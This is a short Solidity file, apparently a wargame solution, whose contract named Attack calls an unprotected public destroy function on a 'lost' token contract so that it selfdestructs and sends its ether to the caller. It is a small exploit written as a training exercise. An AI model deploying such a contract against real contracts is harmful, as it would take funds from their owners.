// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// We can find the "lost" token contract address from etherscan, using the instance address 


interface ISimpleToken {
    function destroy(address payable _to) external;
}

// This contract calls the destroy function which uses selfdestruct opcode to delete the contract
// -> sends funds to us!
contract Attack {
    ISimpleToken public simpleToken;

    constructor(address _simpleToken) public {
        simpleToken = ISimpleToken(_simpleToken);
    }

    function recoverFunds() public {
        simpleToken.destroy(msg.sender);
    } 
}